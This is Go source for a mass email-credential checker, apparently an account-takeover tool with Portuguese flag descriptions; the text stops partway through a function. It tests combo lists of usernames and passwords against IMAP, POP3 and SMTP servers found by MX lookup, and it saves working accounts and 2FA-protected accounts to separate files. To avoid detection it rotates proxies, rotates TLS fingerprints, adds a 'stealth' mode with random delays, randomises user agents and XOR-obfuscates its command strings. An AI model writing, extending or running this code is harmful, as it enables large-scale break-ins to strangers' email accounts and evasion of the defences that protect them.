// Tools/chk/chk.go
package main

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/des"
	"crypto/md5"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/smtp"
	"net/textproto"
	"net/url"
	"os"
	"os/signal"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	utls "github.com/refraction-networking/utls"
	"golang.org/x/crypto/md4"
	"golang.org/x/net/html"
	"golang.org/x/net/http2"
	"golang.org/x/net/proxy"
)

const xorKey byte = 0xAA

func x(obf []byte) string {
	b := make([]byte, len(obf))
	for i, c := range obf {
		b[i] = c ^ xorKey
	}
	return string(b)
}

var (
	_ = cmdLogin
	_ = cmdCapab
	_ = cmdStartls
	_ = cmdUser
	_ = cmdPass
	_ = cmdCapa
	_ = cmdStls
	_ = cmdAuth
	_ = cmdLoginSmtp
)

type Logger struct {
	mu      sync.Mutex
	enabled bool
}

func (l *Logger) Info(msg string, fields map[string]interface{}) {
	if !l.enabled {
		return
	}
	l.mu.Lock()
	defer l.mu.Unlock()
	timestamp := time.Now().Format(time.RFC3339Nano)
	entry := map[string]interface{}{
		"time":    timestamp,
		"level":   "info",
		"message": msg,
	}
	for k, v := range fields {
		entry[k] = v
	}
	b, _ := json.Marshal(entry)
	fmt.Fprintf(os.Stderr, "%s\n", b)
}

func (l *Logger) Error(msg string, fields map[string]interface{}) {
	l.mu.Lock()
	defer l.mu.Unlock()
	entry := map[string]interface{}{
		"time":    time.Now().Format(time.RFC3339Nano),
		"level":   "error",
		"message": msg,
	}
	for k, v := range fields {
		entry[k] = v
	}
	b, _ := json.Marshal(entry)
	fmt.Fprintf(os.Stderr, "%s\n", b)
}

var logg = &Logger{}

type Stats struct {
	processed int64
	live      int64
	twofa     int64
	errors    int64
	start     time.Time
}

func (s *Stats) String() string {
	elapsed := time.Since(s.start).Round(time.Millisecond)
	return fmt.Sprintf("Processed: %d | Live: %d | 2FA: %d | Errors: %d | Time: %v",
		atomic.LoadInt64(&s.processed),
		atomic.LoadInt64(&s.live),
		atomic.LoadInt64(&s.twofa),
		atomic.LoadInt64(&s.errors),
		elapsed)
}

var (
	threads         int
	timeout         time.Duration
	delay           time.Duration
	proxiesFile     string
	verbose         bool
	showStats       bool
	useDoH          bool
	useDoT          bool
	stealthMode     bool
	insecureFlag    bool
	pipelineMode    bool
	utlsMode        bool
	localIPs        []net.IP
	localIPMu       sync.Mutex
	localIPIdx      int
	maxConns        int
	maxDNSLookups   int
	poolSize        int
	proxyHealthIntv time.Duration
	portScanTimeout time.Duration
	portScanDial    time.Duration
	portCacheTTL    time.Duration
	dnsCacheTTL     time.Duration
	defaultPorts    []int
	extraPorts      []int
	subdomains      []string
	enableIMAP      bool
	enablePOP3      bool
	enableSMTP      bool
	livePath        string
	twofaPath       string
	comboSep        string
	userAgentList   []string
	languageList    []string
	webmailFallback bool
	scraping2FA     bool
	http2Enabled    bool
	maxIdleConns    int
	maxConnsPerHost int
	idleConnTimeout time.Duration
)

func init() {
	flag.IntVar(&threads, "t", 50, "workers concorrentes")
	flag.DurationVar(&timeout, "timeout", 8*time.Second, "timeout de rede")
	flag.DurationVar(&delay, "delay", 0, "delay base entre tentativas (ms)")
	flag.StringVar(&proxiesFile, "proxies", "", "lista de proxies (http://, socks4://, socks5://)")
	flag.BoolVar(&verbose, "v", false, "log detalhado")
	flag.BoolVar(&showStats, "stats", false, "imprimir estatísticas finais")
	flag.BoolVar(&useDoH, "doh", false, "DNS over HTTPS como fallback")
	flag.BoolVar(&useDoT, "dot", false, "DNS over TLS como fallback adicional")
	flag.BoolVar(&stealthMode, "stealth", false, "modo furtivo (shuffle, delays randômicos, fingerprint TLS)")
	flag.BoolVar(&insecureFlag, "insecure", true, "ignorar verificação de certificado TLS")
	flag.BoolVar(&pipelineMode, "pipeline", false, "pipeline assíncrono de comandos IMAP")
	flag.BoolVar(&utlsMode, "utls", false, "rotação de TLS fingerprint (utls)")
	flag.IntVar(&maxConns, "max-conns", 100, "máximo de conexões simultâneas")
	flag.IntVar(&maxDNSLookups, "max-dns", 20, "máximo de lookups DNS simultâneos")
	flag.IntVar(&poolSize, "pool-size", 3, "tamanho da pool de conexão por host")
	flag.DurationVar(&proxyHealthIntv, "proxy-check", 30*time.Second, "intervalo de health check de proxies")
	flag.DurationVar(&portScanTimeout, "port-scan-timeout", 3*time.Second, "timeout do scan de portas")
	flag.DurationVar(&portScanDial, "port-scan-dial", 1*time.Second, "timeout de discagem do scan de portas")
	flag.DurationVar(&portCacheTTL, "port-cache-ttl", 5*time.Minute, "TTL do cache de portas")
	flag.DurationVar(&dnsCacheTTL, "dns-cache-ttl", 5*time.Minute, "TTL do cache DNS")
	flag.Var(&intSlice{&defaultPorts}, "default-ports", "portas padrão (ex: 993,995,465)")
	flag.Var(&intSlice{&extraPorts}, "extra-ports", "portas extras para scan")
	flag.Var(&stringSlice{&subdomains}, "subs", "subdomínios a testar")
	flag.BoolVar(&enableIMAP, "imap", true, "habilitar verificação IMAP")
	flag.BoolVar(&enablePOP3, "pop3", true, "habilitar verificação POP3")
	flag.BoolVar(&enableSMTP, "smtp", true, "habilitar verificação SMTP")
	flag.StringVar(&livePath, "live", "live.txt", "arquivo de saída live")
	flag.StringVar(&twofaPath, "twofa", "live_2fa.txt", "arquivo de saída 2FA")
	flag.StringVar(&comboSep, "separator", ":", "separador da combo")
	flag.Var(&stringSlice{&userAgentList}, "user-agents", "lista de User-Agents")
	flag.Var(&stringSlice{&languageList}, "languages", "lista de Accept-Language")
	flag.BoolVar(&webmailFallback, "webmail", true, "fallback para webmail")
	flag.BoolVar(&scraping2FA, "scrape-2fa", true, "detectar 2FA por scraping")
	flag.BoolVar(&http2Enabled, "http2", false, "habilitar HTTP/2")
	flag.IntVar(&maxIdleConns, "http-max-idle", 100, "max idle connections HTTP")
	flag.IntVar(&maxConnsPerHost, "http-max-host", 20, "max connections por host HTTP")
	flag.DurationVar(&idleConnTimeout, "http-idle-timeout", 90*time.Second, "idle connection timeout HTTP")
}

type intSlice struct{ s *[]int }

func (is *intSlice) Set(v string) error {
	for _, p := range strings.Split(v, ",") {
		n, _ := strconv.Atoi(strings.TrimSpace(p))
		if n > 0 {
			*is.s = append(*is.s, n)
		}
	}
	return nil
}
func (is *intSlice) String() string { return fmt.Sprint(*is.s) }

type stringSlice struct{ s *[]string }

func (ss *stringSlice) Set(v string) error {
	for _, p := range strings.Split(v, ",") {
		*ss.s = append(*ss.s, strings.TrimSpace(p))
	}
	return nil
}
func (ss *stringSlice) String() string { return fmt.Sprint(*ss.s) }

var (
	liveFile   *os.File
	twofaFile  *os.File
	liveMu     sync.Mutex
	stats      Stats
	globalCtx  context.Context
	cancelCtx  context.CancelFunc
	wg         sync.WaitGroup
	proxyList  []proxyEntry
	proxyMu    sync.Mutex
	rng        = rand.New(rand.NewSource(time.Now().UnixNano()))
	connSem    chan struct{}
	dnsSem     chan struct{}
	httpClient *http.Client

	portCache   = map[string]*portCacheEntry{}
	portCacheMu sync.Mutex

	brPool = sync.Pool{New: func() interface{} { return bufio.NewReader(nil) }}
	bbPool = sync.Pool{New: func() interface{} { return new(bytes.Buffer) }}
)

type portCacheEntry struct {
	ports     []int
	expiresAt time.Time
}

type proxyEntry struct {
	url      *url.URL
	dialer   proxy.Dialer
	alive    bool
	lastTest time.Time
}

type rttStats struct {
	ewma float64
	mu   sync.Mutex
}

var rttMap sync.Map

func updateRTT(addr string, rtt time.Duration) {
	val, _ := rttMap.LoadOrStore(addr, &rttStats{ewma: float64(rtt)})
	st := val.(*rttStats)
	st.mu.Lock()
	st.ewma = 0.7*st.ewma + 0.3*float64(rtt)
	st.mu.Unlock()
}

func getTimeout(addr string) time.Duration {
	if val, ok := rttMap.Load(addr); ok {
		st := val.(*rttStats)
		st.mu.Lock()
		avg := time.Duration(st.ewma)
		st.mu.Unlock()
		margin := 2 * time.Second
		if avg > 5*time.Second {
			margin = 5 * time.Second
		}
		t := avg + margin
		if t < timeout {
			return t
		}
	}
	return timeout
}

type socks4Dialer struct {
	proxyHost string
	user      string
}

func (s *socks4Dialer) Dial(network, addr string) (net.Conn, error) {
	return s.DialContext(context.Background(), network, addr)
}

func (s *socks4Dialer) DialContext(ctx context.Context, network, addr string) (net.Conn, error) {
	conn, err := (&net.Dialer{Timeout: timeout}).DialContext(ctx, "tcp", s.proxyHost)
	if err != nil {
		return nil, err
	}
	host, portStr, err := net.SplitHostPort(addr)
	if err != nil {
		conn.Close()
		return nil, err
	}
	port, _ := strconv.Atoi(portStr)
	ip := net.ParseIP(host)
	var ipBytes []byte
	if ip != nil {
		if ip4 := ip.To4(); ip4 != nil {
			ipBytes = ip4
		} else {
			conn.Close()
			return nil, errors.New("SOCKS4 only supports IPv4")
		}
	} else {
		var r net.Resolver
		ips, err := r.LookupIP(ctx, "ip4", host)
		if err != nil || len(ips) == 0 {
			conn.Close()
			return nil, errors.New("SOCKS4 cannot resolve hostname")
		}
		ipBytes = ips[0].To4()
		if ipBytes == nil {
			conn.Close()
			return nil, errors.New("SOCKS4 only supports IPv4")
		}
	}
	req := []byte{4, 1}
	req = append(req, byte(port>>8), byte(port&0xFF))
	req = append(req, ipBytes...)
	if s.user != "" {
		req = append(req, []byte(s.user)...)
	}
	req = append(req, 0)
	if _, err := conn.Write(req); err != nil {
		conn.Close()
		return nil, err
	}
	resp := make([]byte, 8)
	if _, err := io.ReadFull(conn, resp); err != nil {
		conn.Close()
		return nil, err
	}
	if resp[1] != 0x5A {
		conn.Close()
		return nil, fmt.Errorf("SOCKS4 request rejected: %d", resp[1])
	}
	return conn, nil
}

type socks5AuthDialer struct {
	proxyHost string
	user      string
	password  string
}

func (s *socks5AuthDialer) Dial(network, addr string) (net.Conn, error) {
	return s.DialContext(context.Background(), network, addr)
}

func (s *socks5AuthDialer) DialContext(ctx context.Context, network, addr string) (net.Conn, error) {
	conn, err := (&net.Dialer{Timeout: timeout}).DialContext(ctx, "tcp", s.proxyHost)
	if err != nil {
		return nil, err
	}
	conn.Write([]byte{5, 2, 0, 2})
	resp := make([]byte, 2)
	if _, err := io.ReadFull(conn, resp); err != nil {
		conn.Close()
		return nil, err
	}
	if resp[0] != 5 || resp[1] == 0xFF {
		conn.Close()
		return nil, errors.New("SOCKS5 no acceptable auth method")
	}
	if resp[1] == 2 {
		authMsg := []byte{1, byte(len(s.user))}
		authMsg = append(authMsg, []byte(s.user)...)
		authMsg = append(authMsg, byte(len(s.password)))
		authMsg = append(authMsg, []byte(s.password)...)
		conn.Write(authMsg)
		authResp := make([]byte, 2)
		if _, err := io.ReadFull(conn, authResp); err != nil {
			conn.Close()
			return nil, err
		}
		if authResp[0] != 1 || authResp[1] != 0 {
			conn.Close()
			return nil, errors.New("SOCKS5 authentication failed")
		}
	}
	host, portStr, err := net.SplitHostPort(addr)
	if err != nil {
		conn.Close()
		return nil, err
	}
	port, _ := strconv.Atoi(portStr)
	ip := net.ParseIP(host)
	var atyp byte = 1
	var dstAddr []byte
	if ip != nil {
		if ip4 := ip.To4(); ip4 != nil {
			atyp = 1
			dstAddr = ip4
		} else {
			atyp = 4
			dstAddr = ip.To16()
		}
	} else {
		atyp = 3
		dstAddr = append([]byte{byte(len(host))}, []byte(host)...)
	}
	req := []byte{5, 1, 0, atyp}
	req = append(req, dstAddr...)
	req = append(req, byte(port>>8), byte(port&0xFF))
	conn.Write(req)
	resp2 := make([]byte, 4)
	if _, err := io.ReadFull(conn, resp2); err != nil {
		conn.Close()
		return nil, err
	}
	if resp2[1] != 0 {
		conn.Close()
		return nil, fmt.Errorf("SOCKS5 request failed: %d", resp2[1])
	}
	switch resp2[3] {
	case 1:
		if _, err := io.ReadFull(conn, make([]byte, 4)); err != nil {
			conn.Close()
			return nil, err
		}
	case 3:
		lenByte := make([]byte, 1)
		if _, err := io.ReadFull(conn, lenByte); err != nil {
			conn.Close()
			return nil, err
		}
		if _, err := io.ReadFull(conn, make([]byte, int(lenByte[0]))); err != nil {
			conn.Close()
			return nil, err
		}
	case 4:
		if _, err := io.ReadFull(conn, make([]byte, 16)); err != nil {
			conn.Close()
			return nil, err
		}
	}
	if _, err := io.ReadFull(conn, make([]byte, 2)); err != nil {
		conn.Close()
		return nil, err
	}
	return conn, nil
}

type httpProxyAuthDialer struct {
	proxyHost string
	user      string
	password  string
}

func (h *httpProxyAuthDialer) Dial(network, addr string) (net.Conn, error) {
	return h.DialContext(context.Background(), network, addr)
}

func (h *httpProxyAuthDialer) DialContext(ctx context.Context, network, addr string) (net.Conn, error) {
	d := net.Dialer{Timeout: timeout}
	conn, err := d.DialContext(ctx, "tcp", h.proxyHost)
	if err != nil {
		return nil, err
	}
	auth := base64.StdEncoding.EncodeToString([]byte(h.user + ":" + h.password))
	req := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\nProxy-Authorization: Basic %s\r\n\r\n", addr, addr, auth)
	if _, err := conn.Write([]byte(req)); err != nil {
		conn.Close()
		return nil, err
	}
	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
	if err != nil {
		conn.Close()
		return nil, err
	}
	if resp.StatusCode != 200 {
		conn.Close()
		return nil, fmt.Errorf("proxy CONNECT returned %d", resp.StatusCode)
	}
	return conn, nil
}

func loadProxies(path string) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		u, err := url.Parse(line)
		if err != nil {
			continue
		}
		entry := proxyEntry{url: u, alive: true}
		user := u.User.Username()
		pass, _ := u.User.Password()
		switch u.Scheme {
		case "socks4":
			entry.dialer = &socks4Dialer{proxyHost: u.Host, user: user}
		case "socks5":
			if user != "" {
				entry.dialer = &socks5AuthDialer{proxyHost: u.Host, user: user, password: pass}
			} else {
				d, err := proxy.SOCKS5("tcp", u.Host, nil, proxy.Direct)
				if err == nil {
					entry.dialer = d
				}
			}
		case "http", "https":
			if user != "" {
				entry.dialer = &httpProxyAuthDialer{proxyHost: u.Host, user: user, password: pass}
			} else {
				entry.dialer = &httpProxyDialer{proxyHost: u.Host}
			}
		default:
			continue
		}
		proxyList = append(proxyList, entry)
	}
	return scanner.Err()
}

type httpProxyDialer struct {
	proxyHost string
}

func (h *httpProxyDialer) Dial(network, addr string) (net.Conn, error) {
	return h.DialContext(context.Background(), network, addr)
}

func (h *httpProxyDialer) DialContext(ctx context.Context, network, addr string) (net.Conn, error) {
	d := net.Dialer{Timeout: timeout}
	conn, err := d.DialContext(ctx, "tcp", h.proxyHost)
	if err != nil {
		return nil, err
	}
	req := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", addr, addr)
	if _, err := conn.Write([]byte(req)); err != nil {
		conn.Close()
		return nil, err
	}
	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
	if err != nil {
		conn.Close()
		return nil, err
	}
	if resp.StatusCode != 200 {
		conn.Close()
		return nil, fmt.Errorf("proxy CONNECT returned %d", resp.StatusCode)
	}
	return conn, nil
}

func pickProxy() (proxy.Dialer, string, bool) {
	proxyMu.Lock()
	defer proxyMu.Unlock()
	aliveCount := 0
	for i := range proxyList {
		if proxyList[i].alive {
			aliveCount++
		}
	}
	if aliveCount == 0 {
		return proxy.Direct, "", false
	}
	idx := rng.Intn(len(proxyList))
	attempts := 0
	for !proxyList[idx].alive && attempts < len(proxyList) {
		idx = (idx + 1) % len(proxyList)
		attempts++
	}
	if !proxyList[idx].alive {
		return proxy.Direct, "", false
	}
	p := proxyList[idx]
	return p.dialer, p.url.Host, true
}

func proxyHealthCheck() {
	ticker := time.NewTicker(proxyHealthIntv)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			proxyMu.Lock()
			for i := range proxyList {
				p := &proxyList[i]
				conn, err := p.dialer.Dial("tcp", "smtp.gmail.com:587")
				if err != nil {
					p.alive = false
					continue
				}
				conn.Close()
				p.alive = true
				p.lastTest = time.Now()
			}
			proxyMu.Unlock()
		case <-globalCtx.Done():
			return
		}
	}
}

type connPool struct {
	mu   sync.Mutex
	pool map[string]chan net.Conn
}

var pool = &connPool{
	pool: make(map[string]chan net.Conn),
}

func (cp *connPool) get(addr string, dial func() (net.Conn, error)) (net.Conn, error) {
	cp.mu.Lock()
	ch, ok := cp.pool[addr]
	if ok {
		select {
		case conn := <-ch:
			cp.mu.Unlock()
			if isConnAlive(conn) {
				return conn, nil
			}
			conn.Close()
			return dial()
		default:
			cp.mu.Unlock()
			return dial()
		}
	}
	ch = make(chan net.Conn, poolSize)
	cp.pool[addr] = ch
	cp.mu.Unlock()
	return dial()
}

func (cp *connPool) put(addr string, conn net.Conn) {
	if conn == nil {
		return
	}
	cp.mu.Lock()
	ch, ok := cp.pool[addr]
	if !ok {
		ch = make(chan net.Conn, poolSize)
		cp.pool[addr] = ch
	}
	cp.mu.Unlock()
	select {
	case ch <- conn:
	default:
		conn.Close()
	}
}

func isConnAlive(conn net.Conn) bool {
	conn.SetReadDeadline(time.Now().Add(10 * time.Millisecond))
	one := make([]byte, 1)
	_, err := conn.Read(one)
	conn.SetReadDeadline(time.Time{})
	return err == nil
}

func recycleOrClose(conn net.Conn, addr string) {
	if conn == nil {
		return
	}
	if isConnAlive(conn) {
		pool.put(addr, conn)
		return
	}
	conn.Close()
}

func dialTCP(ctx context.Context, addr string) (net.Conn, error) {
	conn, err := pool.get(addr, func() (net.Conn, error) {
		dialer, _, isSocks := pickProxy()
		if isSocks || dialer != proxy.Direct {
			return dialer.(interface {
				DialContext(ctx context.Context, network, addr string) (net.Conn, error)
			}).DialContext(ctx, "tcp", addr)
		}
		d := net.Dialer{
			Timeout:   getTimeout(addr),
			KeepAlive: 30 * time.Second,
			Control:   setSocketOptions,
		}
		if len(localIPs) > 0 {
			d.LocalAddr = &net.TCPAddr{IP: getLocalIP()}
		}
		return d.DialContext(ctx, "tcp", addr)
	})
	if err != nil {
		return nil, err
	}
	return conn, nil
}

func dialTLSWithPool(ctx context.Context, addr string, config *tls.Config) (net.Conn, error) {
	tlsAddr := "tls:" + addr
	conn, err := pool.get(tlsAddr, func() (net.Conn, error) {
		rawConn, err := dialTCP(ctx, addr)
		if err != nil {
			return nil, err
		}
		if utlsMode {
			uconfig := &utls.Config{
				InsecureSkipVerify: config.InsecureSkipVerify,
				ServerName:         config.ServerName,
			}
			tlsConn, err := utls.Dial("tcp", addr, uconfig)
			if err != nil {
				rawConn.Close()
				return nil, err
			}
			return tlsConn, nil
		} else {
			tlsConn := tls.Client(rawConn, config)
			if err := tlsConn.HandshakeContext(ctx); err != nil {
				rawConn.Close()
				return nil, err
			}
			return tlsConn, nil
		}
	})
	if err != nil {
		return nil, err
	}
	return conn, nil
}

func dialProxyAware(ctx context.Context, addr string) (net.Conn, error) {
	conn, err := dialTCP(ctx, addr)
	if err != nil {
		return nil, err
	}
	start := time.Now()
	rtt := time.Since(start)
	updateRTT(addr, rtt)
	return conn, nil
}

func dialTLSWithProxy(ctx context.Context, addr string, config *tls.Config) (net.Conn, error) {
	conn, err := dialTLSWithPool(ctx, addr, config)
	if err != nil {
		return nil, err
	}
	start := time.Now()
	rtt := time.Since(start)
	updateRTT(addr, rtt)
	return conn, nil
}

func setSocketOptions(network, address string, c syscall.RawConn) error {
	var operr error
	err := c.Control(func(fd uintptr) {
		if err := syscall.SetsockoptInt(syscall.Handle(fd), syscall.IPPROTO_TCP, syscall.TCP_NODELAY, 1); err != nil {
			operr = err
		}
	})
	if err != nil {
		return err
	}
	return operr
}

func getLocalIP() net.IP {
	localIPMu.Lock()
	defer localIPMu.Unlock()
	if len(localIPs) == 0 {
		return nil
	}
	ip := localIPs[localIPIdx%len(localIPs)]
	localIPIdx++
	return ip
}

type dnsCacheEntry struct {
	records   []*net.MX
	expiresAt time.Time
}

var dnsCache sync.Map

func resolveMX(ctx context.Context, domain string) ([]*net.MX, error) {
	if entry, ok := dnsCache.Load(domain); ok {
		e := entry.(*dnsCacheEntry)
		if time.Now().Before(e.expiresAt) {
			return e.records, nil
		}
		dnsCache.Delete(domain)
	}
	select {
	case dnsSem <- struct{}{}:
		defer func() { <-dnsSem }()
	case <-ctx.Done():
		return nil, ctx.Err()
	}
	mxs, err := net.DefaultResolver.LookupMX(ctx, domain)
	if err == nil && len(mxs) > 0 {
		sort.Slice(mxs, func(i, j int) bool { return mxs[i].Pref < mxs[j].Pref })
		dnsCache.Store(domain, &dnsCacheEntry{records: mxs, expiresAt: time.Now().Add(dnsCacheTTL)})
		return mxs, nil
	}
	if useDoH {
		mxs, err := dohLookupMX(ctx, domain)
		if err == nil && len(mxs) > 0 {
			return mxs, nil
		}
	}
	if useDoT {
		mxs, err := dotLookupMX(ctx, domain)
		if err == nil && len(mxs) > 0 {
			return mxs, nil
		}
	}
	return nil, err
}

func dohLookupMX(ctx context.Context, domain string) ([]*net.MX, error) {
	reqURL := fmt.Sprintf("https://cloudflare-dns.com/dns-query?name=%s&type=MX", domain)
	req, _ := http.NewRequestWithContext(ctx, "GET", reqURL, nil)
	req.Header.Set("Accept", "application/dns-json")
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var result struct {
		Answer []struct {
			Data string `json:"data"`
			Type int    `json:"type"`
		} `json:"Answer"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, err
	}
	var mxs []*net.MX
	for _, ans := range result.Answer {
		if ans.Type == 15 {
			parts := strings.Fields(ans.Data)
			if len(parts) >= 2 {
				pref, _ := strconv.ParseUint(parts[0], 10, 16)
				mxs = append(mxs, &net.MX{
					Pref: uint16(pref),
					Host: strings.TrimSuffix(parts[1], "."),
				})
			}
		}
	}
	if len(mxs) == 0 {
		return nil, errors.New("no MX records from DoH")
	}
	sort.Slice(mxs, func(i, j int) bool { return mxs[i].Pref < mxs[j].Pref })
	dnsCache.Store(domain, &dnsCacheEntry{records: mxs, expiresAt: time.Now().Add(dnsCacheTTL)})
	return mxs, nil
}

func dotLookupMX(ctx context.Context, domain string) ([]*net.MX, error) {
	dotServer := "1.1.1.1:853"
	conn, err := tls.Dial("tcp", dotServer, &tls.Config{InsecureSkipVerify: insecureFlag})
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	qname := domain + "."
	header := make([]byte, 12)
	binary.BigEndian.PutUint16(header[0:2], 0xABCD)
	header[2] = 1
	header[5] = 1
	question := buildDNSQuestion(qname, 15)
	msg := append(header, question...)
	frame := append([]byte{0, byte(len(msg))}, msg...)
	if _, err := conn.Write(frame); err != nil {
		return nil, err
	}
	respFrame := make([]byte, 2)
	if _, err := io.ReadFull(conn, respFrame); err != nil {
		return nil, err
	}
	length := int(binary.BigEndian.Uint16(respFrame))
	respData := make([]byte, length)
	if _, err := io.ReadFull(conn, respData); err != nil {
		return nil, err
	}
	if len(respData) < 12 {
		return nil, errors.New("invalid DNS response")
	}
	var mxs []*net.MX
	offset := 12
	_ = binary.BigEndian.Uint16(respData[4:6])
	offset += skipDNSName(respData, offset) + 4
	ancount := binary.BigEndian.Uint16(respData[6:8])
	for i := 0; i < int(ancount); i++ {
		offset = skipDNSName(respData, offset)
		if offset+10 > len(respData) {
			break
		}
		atype := binary.BigEndian.Uint16(respData[offset : offset+2])
		_ = binary.BigEndian.Uint16(respData[offset+2 : offset+4])
		rdlength := binary.BigEndian.Uint16(respData[offset+8 : offset+10])
		offset += 10
		if offset+int(rdlength) > len(respData) {
			break
		}
		if atype == 15 && rdlength >= 2 {
			pref := binary.BigEndian.Uint16(respData[offset : offset+2])
			exchange := parseDNSName(respData, offset+2)
			mxs = append(mxs, &net.MX{Host: strings.TrimSuffix(exchange, "."), Pref: pref})
		}
		offset += int(rdlength)
	}
	if len(mxs) == 0 {
		return nil, errors.New("no MX in DoT response")
	}
	sort.Slice(mxs, func(i, j int) bool { return mxs[i].Pref < mxs[j].Pref })
	dnsCache.Store(domain, &dnsCacheEntry{records: mxs, expiresAt: time.Now().Add(dnsCacheTTL)})
	return mxs, nil
}

func buildDNSQuestion(qname string, qtype uint16) []byte {
	var buf bytes.Buffer
	for _, label := range strings.Split(qname, ".") {
		if len(label) == 0 {
			continue
		}
		buf.WriteByte(byte(len(label)))
		buf.WriteString(label)
	}
	buf.WriteByte(0)
	q := make([]byte, 4)
	binary.BigEndian.PutUint16(q[0:2], qtype)
	binary.BigEndian.PutUint16(q[2:4], 1)
	buf.Write(q)
	return buf.Bytes()
}

func skipDNSName(data []byte, offset int) int {
	for offset < len(data) {
		length := int(data[offset])
		if length == 0 {
			return offset + 1
		}
		if length&0xC0 == 0xC0 {
			return offset + 2
		}
		offset += length + 1
	}
	return len(data)
}

func parseDNSName(data []byte, offset int) string {
	var parts []string
	jumped := false
	jumpOffset := 0
	for {
		if offset >= len(data) {
			break
		}
		length := int(data[offset])
		if length == 0 {
			offset++
			break
		}
		if length&0xC0 == 0xC0 {
			if !jumped {
				jumpOffset = offset + 2
			}
			pointer := int(binary.BigEndian.Uint16(data[offset:offset+2]) & 0x3FFF)
			offset = pointer
			jumped = true
			continue
		}
		offset++
		parts = append(parts, string(data[offset:offset+length]))
		offset += length
	}
	if jumped && jumpOffset > 0 {
		offset = jumpOffset
	}
	return strings.Join(parts, ".")
}

func candidateHosts(domain string) []string {
	hosts := []string{}
	ctx, cancel := context.WithTimeout(globalCtx, timeout)
	defer cancel()
	mxs, _ := resolveMX(ctx, domain)
	for _, mx := range mxs {
		hosts = append(hosts, mx.Host)
	}
	for _, sub := range subdomains {
		hosts = append(hosts, sub+"."+domain)
	}
	seen := map[string]bool{}
	unique := hosts[:0]
	for _, h := range hosts {
		if !seen[h] {
			seen[h] = true
			unique = append(unique, h)
		}
	}
	return unique
}

type circuitBreaker struct {
	mu           sync.Mutex
	failures     int
	lastFailTime time.Time
	state        int
}

var cbMap sync.Map

func getCircuitBreaker(host string) *circuitBreaker {
	v, _ := cbMap.LoadOrStore(host, &circuitBreaker{state: 0})
	return v.(*circuitBreaker)
}

func (cb *circuitBreaker) allow() bool {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	now := time.Now()
	switch cb.state {
	case 0:
		return true
	case 1:
		if now.Sub(cb.lastFailTime) > 30*time.Second {
			cb.state = 2
			return true
		}
		return false
	case 2:
		return true
	default:
		return true
	}
}

func (cb *circuitBreaker) success() {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	cb.failures = 0
	cb.state = 0
}

func (cb *circuitBreaker) failure() {
	cb.mu.Lock()
	defer cb.mu.Unlock()
	cb.failures++
	cb.lastFailTime = time.Now()
	if cb.failures >= 3 {
		cb.state = 1
	}
}

type rateLimiter struct {
	mu      sync.Mutex
	buckets map[string]*tokenBucket
}

type tokenBucket struct {
	tokens   float64
	lastTime time.Time
	rate     float64
	burst    int
	mu       sync.Mutex
}

var rl = &rateLimiter{
	buckets: make(map[string]*tokenBucket),
}

func (rl *rateLimiter) allow(host string) bool {
	rl.mu.Lock()
	b, ok := rl.buckets[host]
	if !ok {
		b = &tokenBucket{
			tokens:   5,
			lastTime: time.Now(),
			rate:     10,
			burst:    5,
		}
		rl.buckets[host] = b
	}
	rl.mu.Unlock()
	b.mu.Lock()
	defer b.mu.Unlock()
	now := time.Now()
	elapsed := now.Sub(b.lastTime).Seconds()
	b.tokens += elapsed * b.rate
	if b.tokens > float64(b.burst) {
		b.tokens = float64(b.burst)
	}
	b.lastTime = now
	if b.tokens >= 1 {
		b.tokens--
		return true
	}
	return false
}

type attempt struct {
	proto       string
	port        int
	implicitTLS bool
	key         string
}

type ProtocolStats struct {
	success int
	fail    int
	mu      sync.Mutex
}

var protocolStatsMap sync.Map

func getProtocolStats(key string) *ProtocolStats {
	v, _ := protocolStatsMap.LoadOrStore(key, &ProtocolStats{})
	return v.(*ProtocolStats)
}

func scoreAttempt(key string) float64 {
	ps := getProtocolStats(key)
	ps.mu.Lock()
	defer ps.mu.Unlock()
	total := ps.success + ps.fail
	if total == 0 {
		return 0.5
	}
	return float64(ps.success) / float64(total)
}

func updateAttemptStats(key string, success bool) {
	ps := getProtocolStats(key)
	ps.mu.Lock()
	if success {
		ps.success++
	} else {
		ps.fail++
	}
	ps.mu.Unlock()
}

func adaptiveAttempts(domain string, fingerprint string) []attempt {
	var base []attempt
	if enableIMAP {
		base = append(base, attempt{"IMAP", 993, true, "IMAP:993"}, attempt{"IMAP", 143, false, "IMAP:143"})
	}
	if enablePOP3 {
		base = append(base, attempt{"POP3", 995, true, "POP3:995"}, attempt{"POP3", 110, false, "POP3:110"})
	}
	if enableSMTP {
		base = append(base, attempt{"SMTP", 465, true, "SMTP:465"}, attempt{"SMTP", 587, false, "SMTP:587"})
	}
	if fingerprint == "Dovecot" {
		base = nil
		if enableIMAP {
			base = append(base, attempt{"IMAP", 993, true, "IMAP:993"}, attempt{"IMAP", 143, false, "IMAP:143"})
		}
		if enablePOP3 {
			base = append(base, attempt{"POP3", 995, true, "POP3:995"})
		}
	}
	sort.Slice(base, func(i, j int) bool {
		return scoreAttempt(base[i].key) > scoreAttempt(base[j].key)
	})
	return base
}

var userAgents []string
var languages []string

func randomUserAgent() string {
	if len(userAgents) == 0 {
		userAgents = userAgentList
	}
	if len(userAgents) == 0 {
		return "Mozilla/5.0"
	}
	return userAgents[rng.Intn(len(userAgents))]
}

func randomHeaders() map[string]string {
	langs := languages
	if len(langs) == 0 {
		langs = languageList
	}
	if len(langs) == 0 {
		langs = []string{"en-US,en;q=0.9"}
	}
	return map[string]string{
		"User-Agent":      randomUserAgent(),
